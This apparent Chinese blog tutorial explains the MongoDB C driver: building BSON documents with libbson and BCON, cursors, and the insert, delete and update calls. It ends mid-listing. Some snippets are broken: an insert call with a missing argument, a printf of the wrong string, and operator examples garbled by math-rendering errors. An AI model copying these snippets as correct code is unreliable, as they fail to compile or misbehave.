<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">mongoc_database_has_collection</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_database_t</span> *database,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name,<span class="hljs-keyword">bson_error_t</span> *error)</span></span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">bson_error_t</span> &#123;</span><br>   <span class="hljs-keyword">uint32_t</span> domain;<br>   <span class="hljs-keyword">uint32_t</span> code;<br>   <span class="hljs-keyword">char</span> message[BSON_ERROR_BUFFER_SIZE];<br>&#125; <span class="hljs-keyword">bson_error_t</span>;<br></code></pre></div></td></tr></table></figure>
<p>有了database，那么就可以获取某个collection，方法有两个</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">mongoc_collection_t</span> * <span class="hljs-title">mongoc_client_get_collection</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_client_t</span> *client,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *db,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *collection)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">mongoc_collection_t</span> *</span><br><span class="hljs-function"><span class="hljs-title">mongoc_database_get_collection</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_database_t</span> *database, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>接下来，就是重头戏了</p>
<h4 id="creating-bson-documents"><a class="markdownIt-Anchor" href="#creating-bson-documents"></a> Creating BSON Documents</h4>
<p>BSON，类似与JSON，但又有点不同。通过创建BSON Document来实现与MongoDB的交互。如：</p>
<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&gt; db.test.insert(&#123;&#x27;name&#x27;:&#x27;xiaoming&#x27;,&#x27;age&#x27;:<span class="hljs-number">10</span>,info:[&#x27;shy&#x27;,&#x27;helpful&#x27;]&#125;)<br>&gt; db.test.find().pretty()<br>&#123;<br>	<span class="hljs-attr">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;5a8e1dced077dc147db71f81&quot;</span>),<br>	<span class="hljs-attr">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaoming&quot;</span>,<br>	<span class="hljs-attr">&quot;age&quot;</span> : <span class="hljs-number">10</span>,<br>	<span class="hljs-attr">&quot;info&quot;</span> : [<br>		<span class="hljs-string">&quot;shy&quot;</span>,<br>		<span class="hljs-string">&quot;helpful&quot;</span><br>	]<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>BSON文档就有点类似与 {‘name’:’xiaoming’,’age’:10,info:[‘shy’,’helpful’]}</p>
<p>mongoc有几种方式创建BSON文档： <strong>appending key-value pairs, using BCON, or parsing JSON</strong><br />
其中，最简单的就是BCON，不过再次之前先了解下使用 bson**，只需引用 bson.h 即可</p>
<h5 id="bson"><a class="markdownIt-Anchor" href="#bson"></a> bson</h5>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 创建一个BSON文档</span><br><span class="hljs-keyword">bson_t</span> *doc=<span class="hljs-built_in">bson_new</span>();<br><span class="hljs-comment">// 添加一个 UTF-8 字符串，-1 表示该字符串长度</span><br><span class="hljs-built_in">bson_append_utf8</span>(doc,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-number">-1</span>,<span class="hljs-string">&quot;xiaodong&quot;</span>,<span class="hljs-number">-1</span>);<br><span class="hljs-comment">// 添加一个 int32 整数</span><br><span class="hljs-built_in">bson_append_int32</span>(doc,<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">10</span>);<br><span class="hljs-built_in">BSON_APPEND_UTF8</span>(doc,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;xiaoqiang&quot;</span>);<br><span class="hljs-built_in">BSON_APPEND_INT32</span>(doc,<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">11</span>);<br><span class="hljs-comment">// 返回一个 JSON 字符串</span><br><span class="hljs-keyword">char</span> *jsonstr= <span class="hljs-built_in">bson_as_canonical_extended_json</span>(doc,<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(jsonstr)<br><span class="hljs-comment">// 释放由 bson_as_canonical_extended_json 返回char *</span><br><span class="hljs-built_in">bson_free</span>(jsonstr);<br><span class="hljs-comment">// 释放 bson_new 分配的内存</span><br><span class="hljs-built_in">bson_destroy</span>(doc);<br></code></pre></div></td></tr></table></figure>
<p>结果<br />
{ “name” : “xiaodong”, “age” : { “<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 19: …berInt” : “10” }̲, “name” : “xia…'>numberInt” : “10” }, “name” : “xiaoqiang”, “age” : { “</span>numberInt” : “11” } }</p>
<p>可通过 bson** 系列函数 或者 BSON**宏 来添加BSON文档<br />
通过 bson_t 获取 JSON 字符串，可以调用以下函数</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">bson_as_canonical_extended_json</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *bson, <span class="hljs-keyword">size_t</span> *length)</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">bson_as_json</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *bson, <span class="hljs-keyword">size_t</span> *length)</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">bson_as_relaxed_extended_json</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *bson, <span class="hljs-keyword">size_t</span> *length)</span></span><br></code></pre></div></td></tr></table></figure>
<p>必须要有对应的 <strong>bson_free()</strong> 来释放该分配的内存；<strong>bson_destroy()</strong> 来释放一个BSON文档</p>
<h5 id="bcon"><a class="markdownIt-Anchor" href="#bcon"></a> BCON</h5>
<p>用 BCON_* 宏来操控BSON Document我认为更简单些，而且写法也更高级。</p>
<blockquote>
<p>BSON C Object Notation, BCON for short, is an alternative way of constructing BSON documents in a manner closer to the intended format. <strong>It has less type-safety than BSON’s append functions but results in less code</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">bson_t</span> *bson=<span class="hljs-built_in">BCON_NEW</span>(<br>            <span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;xiaoHong&quot;</span>),<br>            <span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-built_in">BCON_INT32</span>(<span class="hljs-number">15</span>),<br>            <span class="hljs-string">&quot;info&quot;</span>,<br>            <span class="hljs-string">&quot;[&quot;</span>,<br>               <span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;country&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;China&quot;</span>), <span class="hljs-string">&quot;&#125;&quot;</span>,<br>               <span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;phone&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;110&quot;</span>), <span class="hljs-string">&quot;&#125;&quot;</span>,<br>            <span class="hljs-string">&quot;]&quot;</span><br>);<br></code></pre></div></td></tr></table></figure>
<p>{ “name” : “xiaoHong”, “age” : { “$numberInt” : “15” }, “info” : [ { “country” : “China” }, { “phone” : “110” } ] }</p>
<p>通过使用 BCON_* 函数更直观、方便简单的创建BSON文档。</p>
<h4 id="creating-bson-from-json"><a class="markdownIt-Anchor" href="#creating-bson-from-json"></a> Creating BSON from JSON</h4>
<p>上面介绍了创建一个BSON文档以及从BSON文档获取一个JSON字符串。<br />
那么，我们是否可以通过JSON字符串反向解析一个BSON文档呢？答案是肯定的。不过，这好像是对于单文档而言，</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">bson_t</span> * <span class="hljs-title">bson_new_from_json</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span> *data, <span class="hljs-keyword">ssize_t</span> len, <span class="hljs-keyword">bson_error_t</span> *error)</span></span>;<br></code></pre></div></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *json = <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaoJun\&quot;,\&quot;age\&quot;:15&#125;&quot;</span>;<br><span class="hljs-keyword">bson_t</span> *newbs= <span class="hljs-built_in">bson_new_from_json</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span>*)json,<span class="hljs-number">-1</span>,<span class="hljs-literal">NULL</span>);<br>jsonstr=<span class="hljs-built_in">bson_as_canonical_extended_json</span>(newbs,<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(json);<br><span class="hljs-built_in">bson_free</span>(jsonstr);<br><span class="hljs-built_in">bson_destroy</span>(newbs);<br></code></pre></div></td></tr></table></figure>
<p>有了这些基础后，那么接下来就不会那么吃力了</p>
<h4 id="遍历-collections"><a class="markdownIt-Anchor" href="#遍历-collections"></a> 遍历 collections</h4>
<p>在MongoDB交互shell中，我们可以直接通过 <code>db.test.find().pretty()</code> 来列出所有的数据。注意 find() 是可以提供参数的</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> db.test.find</span><br>function (query, fields, limit, skip, batchSize, options) &#123;<br>    var cursor = new DBQuery(this._mongo,<br>                             this._db,<br>                             this,<br>                             this._fullName,<br>                             this._massageObject(query),<br>                             fields,<br>                             limit,<br>                             skip,<br>                             batchSize,<br>                             options || this.getQueryOptions());<br>    &#123;<br>        const session = this.getDB().getSession();<br>        const readPreference = session._serverSession.client.getReadPreference(session);<br>        if (readPreference !== null) &#123;<br>            cursor.readPref(readPreference.mode, readPreference.tags);<br>        &#125;<br>        const readConcern = session._serverSession.client.getReadConcern(session);<br>        if (readConcern !== null) &#123;<br>            cursor.readConcern(readConcern.level);<br>        &#125;<br>    &#125;<br>    return cursor;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>mongoc提供了 <strong>mongoc_collection_find_with_opts</strong> 函数来获取一个 游标(<strong>Cursor</strong>) ，注意 <strong>mongoc_collection_find</strong> 被弃用了。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">mongoc_cursor_t</span> * <span class="hljs-title">mongoc_collection_find_with_opts</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_collection_t</span> *collection,<span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *filter,<span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<span class="hljs-keyword">const</span> <span class="hljs-keyword">mongoc_read_prefs_t</span> *read_prefs)</span></span><br></code></pre></div></td></tr></table></figure>
<p><strong>mongoc_collection_find_with_opts</strong> 要求4个参数，参数我们只关注前两个参数，其中 <strong>bson_t *filter</strong> 至关重要，类似于 MYSQL select <em>from tb_xxx *where id = 5</em></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 空BSON文档 &#123;&#125;</span><br><span class="hljs-keyword">bson_t</span> *bson=<span class="hljs-built_in">BCON_NEW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">mongoc_cursor_t</span> *cursor= <span class="hljs-built_in">mongoc_collection_find_with_opts</span>(coll,bson,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// 获取当前文档，注意是一个 const bson_t *，并传入 mongoc_cursor_next 第二个参数</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *ps=<span class="hljs-built_in">mongoc_cursor_current</span>(cursor);<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">mongoc_cursor_next</span>(cursor,&amp;ps))<br>&#123;<br>       <span class="hljs-keyword">char</span> *json=<span class="hljs-built_in">bson_as_canonical_extended_json</span>(ps,&amp;size);<br>       <span class="hljs-built_in">printf</span>(json);<br>       <span class="hljs-built_in">bson_free</span>(json);<br>&#125;<br><span class="hljs-comment">// 释放 cursor</span><br><span class="hljs-built_in">mongoc_cursor_destroy</span>(cursor);<br></code></pre></div></td></tr></table></figure>
<p>bson_t <em>bson=BCON_NEW(NULL); 等价于 db.test.find({}) 或者 db.test.find()当然，也可以这么来写bson_t</em> bson=BCON_NEW(“age”,”{“,”<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 21: …CON_INT32(13),”}̲”);
这就类似于 db.te…'>gt”,BCON_INT32(13),”}”);
这就类似于 db.test.find({‘age’:{‘</span>gt’:13}})</p>
<h4 id="增删查改"><a class="markdownIt-Anchor" href="#增删查改"></a> 增删查改</h4>
<p>像大多数数据库一样，增删查改是必不可少的基本步骤。</p>
<h5 id="insert"><a class="markdownIt-Anchor" href="#insert"></a> insert</h5>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_insert</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                          <span class="hljs-keyword">mongoc_insert_flags_t</span> flags,<br>                          <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *document,<br>                          <span class="hljs-keyword">const</span> <span class="hljs-keyword">mongoc_write_concern_t</span> *write_concern,<br>                          <span class="hljs-keyword">bson_error_t</span> *error);<br><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_insert_one</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *document,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                              <span class="hljs-keyword">bson_t</span> *reply,<br>                              <span class="hljs-keyword">bson_error_t</span> *error);<br><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_insert_many</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> **documents,<br>                               <span class="hljs-keyword">size_t</span> n_documents,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                               <span class="hljs-keyword">bson_t</span> *reply,<br>                               <span class="hljs-keyword">bson_error_t</span> *error);<br></code></pre></div></td></tr></table></figure>
<p>千万别被这么多参数给吓倒了。这里我们只需关注</p>
<blockquote>
<p>mongoc_collection_t *collectionconst bson_t *document<br />
bson_error_t *error(可选，表示错误信息)</p>
</blockquote>
<p>下面是一个简单的例子，省略了大部分代码</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">bson_t</span> *bson=<span class="hljs-built_in">BCON_NEW</span>(<br>            <span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;xiaoDong&quot;</span>),<br>            <span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-built_in">BCON_INT32</span>(<span class="hljs-number">18</span>),<br>            <span class="hljs-string">&quot;info&quot;</span>,<br>            <span class="hljs-string">&quot;[&quot;</span>,<br>               <span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;country&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;China&quot;</span>), <span class="hljs-string">&quot;&#125;&quot;</span>,<br>               <span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;phone&quot;</span>,<span class="hljs-built_in">BCON_UTF8</span>(<span class="hljs-string">&quot;150&quot;</span>), <span class="hljs-string">&quot;&#125;&quot;</span>,<br>            <span class="hljs-string">&quot;]&quot;</span><br>        );<br><span class="hljs-comment">// 插入数据</span><br>retr=<span class="hljs-built_in">mongoc_collection_insert_one</span>(coll,,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;error);<br><span class="hljs-keyword">if</span>(!retr)&#123;<br>     <span class="hljs-built_in">printf</span>(error.message);<br>&#125;<br><span class="hljs-built_in">bson_destroy</span>(bson);<br></code></pre></div></td></tr></table></figure>
<h5 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h5>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_delete_one</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *selector,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                              <span class="hljs-keyword">bson_t</span> *reply,<br>                              <span class="hljs-keyword">bson_error_t</span> *error);<br><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_delete_many</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *selector,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                               <span class="hljs-keyword">bson_t</span> *reply,<br>                               <span class="hljs-keyword">bson_error_t</span> *error);<br></code></pre></div></td></tr></table></figure>
<p><strong>mongoc_collection_delete</strong> 已被弃用，这里没有列出<br />
这个类似Insert，例子就没有了哈 😃</p>
<h5 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h5>
<p>这个前面就是前面的 <strong>遍历collections</strong> ……</p>
<h5 id="update"><a class="markdownIt-Anchor" href="#update"></a> update</h5>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_update</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                          <span class="hljs-keyword">mongoc_update_flags_t</span> flags,<br>                          <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *selector,<br>                          <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *update,<br>                          <span class="hljs-keyword">const</span> <span class="hljs-keyword">mongoc_write_concern_t</span> *write_concern,<br>                          <span class="hljs-keyword">bson_error_t</span> *error);<br><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_update_one</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *selector,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *update,<br>                              <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                              <span class="hljs-keyword">bson_t</span> *reply,<br>                              <span class="hljs-keyword">bson_error_t</span> *error);<br><span class="hljs-built_in">MONGOC_EXPORT</span> (<span class="hljs-keyword">bool</span>)<br><span class="hljs-built_in">mongoc_collection_update_many</span> (<span class="hljs-keyword">mongoc_collection_t</span> *collection,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *selector,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *update,<br>                               <span class="hljs-keyword">const</span> <span class="hljs-keyword">bson_t</span> *opts,<br>                               <span class="hljs-keyword">bson_t</span> *reply,<br>                               <span class="hljs-keyword">bson_error_t</span> *error);<br></code></pre></div></td></tr></table></figure>
<p>注意那个 <strong>mongoc_update_flags_t</strong>，这个经常用到。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>   MONGOC_UPDATE_NONE = <span class="hljs-number">0</span>,<br>   MONGOC_UPDATE_UPSERT = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<br>   MONGOC_UPDATE_MULTI_UPDATE = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,<br>&#125; <span class="hljs-keyword">mongoc_update_flags_t</span>;<br></code></pre></div></td></tr></table></figure>
<p>现在就 <strong>mongoc_collection_update</strong> 这个函数为例，除了那个 const mongoc_write_concern_t *write_concern 参数以外，其他的似乎都挺常用。。。不过再次之前，先来看看Mongo下update数据。</p>
<p>当前 db_test 存在如下数据</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">db<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.find</span>()<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5a8e30c0d077dc147db71f83&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaolong&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">14</span> &#125;<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5a8e3102d077dc147db71f84&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaoqiang&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">10</span> &#125;<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5a8e3108d077dc147db71f85&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaofeng&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">12</span> &#125;<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5a8e38ba53d6700f027556c2&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaoHong&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">15</span>, <span class="hljs-string">&quot;info&quot;</span> : [ &#123; <span class="hljs-string">&quot;country&quot;</span> : <span class="hljs-string">&quot;China&quot;</span> &#125;, &#123; &quot;phone&quot; : <span class="hljs-string">&quot;110&quot;</span><br></code></pre></div></td></tr></table></figure>
<p>我要查看 age 大或等于 12 的记录，那么我可以这样做</p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">db<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.find</span>(&#123;<span class="hljs-string">&#x27;age&#x27;</span>:&#123;<span class="hljs-string">&#x27;$gte&#x27;</span>:<span class="hljs-number">12</span>&#125;&#125;)<br>&gt;&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;5a8e30c0d077dc147db71f83&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaolong&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">14</span> &#125;<br><span class="hljs-string">&quot;xiaofeng&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">12</span> &#125;<br>&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;5a8e38ba53d6700f027556c2&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;xiaoHong&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">15</span>, <span class="hljs-string">&quot;info&quot;</span> : <span 